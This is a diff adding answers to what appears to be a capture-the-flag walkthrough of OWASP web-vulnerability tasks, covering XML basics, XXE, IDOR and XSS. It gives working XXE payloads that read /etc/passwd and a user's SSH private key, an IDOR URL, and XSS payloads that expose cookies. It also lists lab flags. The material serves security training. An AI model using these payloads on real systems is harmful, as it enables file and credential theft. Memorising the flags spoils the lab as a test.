@@ -91,4 +91,196 @@ Login as the admin. What is the flag?
 THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
 ```
 
-# TO BE CONTINUED...
+### Task 13
+
+Full form of XML
+
+```
+eXtensible Markup Language
+```
+
+Is it compulsory to have XML prolog in XML documents?
+```
+No
+```
+
+Can we validate XML documents against a schema?
+```
+Yes
+```
+
+How can we specify XML version and encoding in XML document?
+
+```
+XML Prolog
+```
+
+### Task 14
+
+How do you define a new ELEMENT?
+```
+!ELEMENT
+```
+
+How do you define a ROOT element?
+
+```
+!DOCTYPE
+```
+
+How do you define a new ENTITY?
+
+```
+!ENTITY
+```
+
+### Task 15
+
+If we use this payload then a website vulnerable to XXE(normally) would display the content of the file `/etc/passwd`.
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
+
+### Task 16
+
+Try to display your own name using any payload.
+
+```
+<!DOCTYPE replace [<!ENTITY name "mmjasen"> ]>
+ <userInfo>
+  <firstName>mmja</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+```
+
+See if you can read the /etc/passwd
+
+```
+Check answer above
+```
+
+What is the name of the user in /etc/passwd
+```
+falcon
+```
+
+Where is falcon's SSH key located?
+```
+/home/falcon/.ssh/id_rsa
+```
+
+What are the first 18 characters for falcon's private key?
+
+Command:
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa>]>
+<root>&read;</root>
+```
+Result:
+```
+MIIEogIBAAKCAQEA7b
+```
+
+### Task 18
+
+Look at other users notes. What is the flag?
+
+Go to: 
+
+```
+IP/note.php?note=0
+```
+Output:
+```
+flag{fivefourthree} 
+```
+
+### Task 19
+
+Hack into the webapp, and find the flag!
+
+- Search for 'Pensive Notes' on google it will give you a github-page: https://github.com/NinjaJc01/PensiveNotes. In the README there is a default username:password
+
+```
+thm{4b9513968fd564a87b28aa1f9d672e17}
+```
+
+### Task 20
+
+Navigate to http://MACHINEIP in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
+
+Run command:
+
+```
+<script>alert(“Hello World”)</script>
+```
+Output:
+
+```
+ThereIsMoreToXSSThanYouThink
+```
+
+On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
+
+Run command:
+
+```
+<script>alert(window.location.host)</script>
+```
+
+Output and answer:
+
+```
+ReflectiveXss4TheWin
+```
+
+Now navigate to http://MACHINEIP in your browser and click on the "Stored XSS" tab on the navbar; make an account.
+
+Then add a comment and see if you can insert some of your own HTML.
+
+Create simple button:
+
+```
+<html>
+<body>
+<h1>Button mmja</h1>
+<button type="button" onclick="alert('Hello world!')">Click Me</button>
+</body>
+</html>
+```
+
+Insert and get output:
+
+```
+HTML_T4gs
+```
+
+On the same page, create an alert popup box appear on the page with your document cookies.
+
+See here: https://www.w3schools.com/js/js_cookies.asp
+
+Command:
+
+```
+<script>alert(document.cookie)</script>
+```
+
+Output and answer:
+
+```
+W3LL_D0N3_LVL2
+```
+
+Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
+
+Check the hint
+
+```
+websites_can_be_easily_defaced_with_xss
+```
+
